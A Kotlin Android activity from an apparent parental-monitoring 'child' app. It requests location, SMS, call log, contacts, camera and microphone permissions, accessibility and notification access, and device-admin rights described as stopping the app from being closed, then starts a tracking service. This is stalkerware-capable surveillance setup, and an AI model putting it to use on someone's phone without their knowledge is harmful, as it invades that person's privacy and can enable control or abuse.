package com.abuzahra.child

import android.Manifest
import android.accessibilityservice.AccessibilityService
import android.app.admin.DevicePolicyManager
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.os.PowerManager
import android.provider.Settings
import android.widget.Button
import android.widget.Toast
import androidx.appcompat.app.AppCompatActivity
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat
import com.abuzahra.child.databinding.ActivityMainBinding
import com.abuzahra.child.receivers.MyDeviceAdminReceiver
import com.abuzahra.child.services.MainTrackerService
import com.google.firebase.auth.FirebaseAuth

class MainActivity : AppCompatActivity() {

    private lateinit var binding: ActivityMainBinding
    private val PERMISSIONS_REQUEST_CODE = 1001
    private lateinit var auth: FirebaseAuth

    // قائمة الأذونات الخطرة التي تطلب وقت التشغيل
    private val runtimePermissions = arrayOf(
        Manifest.permission.ACCESS_FINE_LOCATION,
        Manifest.permission.ACCESS_COARSE_LOCATION,
        Manifest.permission.READ_PHONE_STATE,
        Manifest.permission.READ_CALL_LOG,
        Manifest.permission.READ_SMS,
        Manifest.permission.READ_CONTACTS,
        Manifest.permission.CAMERA,
        Manifest.permission.RECORD_AUDIO,
        Manifest.permission.READ_EXTERNAL_STORAGE
    )

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        binding = ActivityMainBinding.inflate(layoutInflater)
        setContentView(binding.root)

        auth = FirebaseAuth.getInstance()
        
        // تسجيل دخول مجهول للربط
        if (auth.currentUser == null) {
            auth.signInAnonymously().addOnSuccessListener {
                saveDeviceId()
            }
        }

        binding.btnSetup.setOnClickListener {
            if (checkAllPermissions()) {
                startServices()
                Toast.makeText(this, "تم تفعيل جميع الخدمات بنجاح", Toast.LENGTH_LONG).show()
                binding.btnSetup.text = "النظام يعمل الآن"
                binding.btnSetup.isEnabled = false
            }
        }
    }

    private fun checkAllPermissions(): Boolean {
        // 1. التحقق من الأذونات العادية
        val missingPermissions = runtimePermissions.filter {
            ContextCompat.checkSelfPermission(this, it) != PackageManager.PERMISSION_GRANTED
        }
        
        if (missingPermissions.isNotEmpty()) {
            ActivityCompat.requestPermissions(this, missingPermissions.toTypedArray(), PERMISSIONS_REQUEST_CODE)
            return false
        }

        // 2. التحقق من Battery Optimization
        if (!isIgnoringBatteryOptimizations()) {
            requestIgnoreBatteryOptimizations()
            return false
        }

        // 3. التحقق من System Alert Window
        if (!Settings.canDrawOverlays(this)) {
            startActivity(Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION, Uri.parse("package:$packageName")))
            return false
        }

        // 4. التحقق من Usage Stats
        if (!hasUsageStatsPermission()) {
            startActivity(Intent(Settings.ACTION_USAGE_ACCESS_SETTINGS))
            return false
        }

        // 5. التحقق من Notification Access
        if (!isNotificationServiceEnabled()) {
            startActivity(Intent("android.settings.ACTION_NOTIFICATION_LISTENER_SETTINGS"))
            return false
        }

        // 6. التحقق من Accessibility
        if (!isAccessibilityServiceEnabled()) {
            startActivity(Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS))
            return false
        }

        // 7. التحقق من Device Admin
        val dpm = getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
        val compName = ComponentName(this, MyDeviceAdminReceiver::class.java)
        if (!dpm.isAdminActive(compName)) {
            val intent = Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN)
            intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, compName)
            intent.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, "مطلوب لحماية التطبيق من الإغلاق")
            startActivity(intent)
            return false
        }

        return true
    }

    private fun startServices() {
        // بدء خدمة التتبع الرئيسية
        val intent = Intent(this, MainTrackerService::class.java)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(intent)
        } else {
            startService(intent)
        }
    }

    // Helper Functions
    private fun isIgnoringBatteryOptimizations(): Boolean {
        val pwrm = getSystemService(Context.POWER_SERVICE) as PowerManager
        return pwrm.isIgnoringBatteryOptimizations(packageName)
    }

    private fun requestIgnoreBatteryOptimizations() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            val intent = Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS)
            intent.data = Uri.parse("package:$packageName")
            startActivity(intent)
        }
    }

    private fun hasUsageStatsPermission(): Boolean {
        try {
            val appOps = getSystemService(Context.APP_OPS_SERVICE) as android.app.AppOpsManager
            val mode = appOps.checkOpNoThrow(android.app.AppOpsManager.OPSTR_GET_USAGE_STATS, android.os.Process.myUid(), packageName)
            return mode == android.app.AppOpsManager.MODE_ALLOWED
        } catch (e: Exception) { return false }
    }

    private fun isNotificationServiceEnabled(): Boolean {
        val packageName = packageName
        val flat = Settings.Secure.getString(contentResolver, "enabled_notification_listeners")
        return flat != null && flat.contains(packageName)
    }

    private fun isAccessibilityServiceEnabled(): Boolean {
        var accessibilityEnabled = 0
        try {
            accessibilityEnabled = Settings.Secure.getInt(contentResolver, Settings.Secure.ACCESSIBILITY_ENABLED)
        } catch (e: Settings.SettingNotFoundException) { }

        if (accessibilityEnabled == 1) {
            val settingValue = Settings.Secure.getString(contentResolver, Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES)
            if (settingValue != null) {
                val splitter = TextUtils.SimpleStringSplitter(':')
                splitter.setString(settingValue)
                while (splitter.hasNext()) {
                    if (splitter.next().equals("${packageName}/com.abuzahra.child.services.MyAccessibilityService", ignoreCase = true)) {
                        return true
                    }
                }
            }
        }
        return false
    }

    private fun saveDeviceId() {
        // حفظ Device ID للمستخدم الحالي
        val uid = auth.currentUser?.uid ?: return
        // سنستخدم هذا الـ UID لربط البيانات
        val sharedPref = getSharedPreferences("child_prefs", Context.MODE_PRIVATE) ?: return
        with(sharedPref.edit()) {
            putString("parent_id", uid) // في الواقع هذا يربط الطفل بولي الأمر
            apply()
        }
    }
}
